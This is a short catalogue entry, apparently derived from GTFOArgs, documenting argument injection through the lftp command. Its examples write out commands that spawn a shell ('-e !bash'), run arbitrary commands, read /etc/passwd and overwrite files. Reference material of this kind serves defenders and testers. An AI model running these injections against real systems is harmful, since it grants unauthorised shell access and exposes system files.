---
trust_level: community
id: argument-injection-lftp
namespace: argument:injection:lftp
name: lftp
description: "Argument injection via lftp"
version: "1.0.0"
capabilities:
  - security.execution.command
  - system.file.read
  - system.file.write
platforms:
  - cross-platform
techniques:
  - execution
  - discovery
  - exfiltration
execution:
  template: "lftp"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Stack commands that include launching a shell."
    command: "lftp -e '!bash'
"
  - description: "Stack commands that include running a command."
    command: "lftp -e '!whoami'
"
  - description: "Read an arbitrary file by specifying it as a script file."
    command: "lftp -f /etc/passwd
"
  - description: "Overwrite a file, or create an empty file."
    command: "lftp -c 'mirror --script=lftp.script'
"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/lftp/"
---

# lftp

GTFOArgs entry for lftp. This binary can be used to inject arguments for execution, file operations, or other capabilities.
